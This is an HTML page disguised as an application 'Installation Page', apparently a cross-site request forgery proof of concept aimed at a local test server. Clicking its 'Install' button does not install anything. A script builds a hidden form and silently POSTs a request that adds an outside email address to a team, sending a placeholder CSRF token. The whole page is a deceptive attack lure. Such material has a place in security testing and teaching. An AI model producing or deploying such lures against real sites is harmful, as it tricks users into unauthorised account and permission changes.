  <title>Installation Page</title>
</head>
<body>
  <h1>Install Application</h1>
  <button id="installbutton">Install</button>

  <script>
    document.getElementById('installbutton').addEventListener('click', () => {
      console.log('Install button clicked');
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:3000/api/teams/1/addUser/blhd3hfy48@bltiwd.com';
      const csrfInput = document.createElement('input');
      csrfInput.type = 'hidden';
      csrfInput.name = 'csrfToken';
      csrfInput.value = 'dummy'; // Placeholder; will likely fail
      form.appendChild(csrfInput);
      document.body.appendChild(form);
      form.submit();
      console.log('Form submitted to change team for user1');
    });
  </script>
</body>
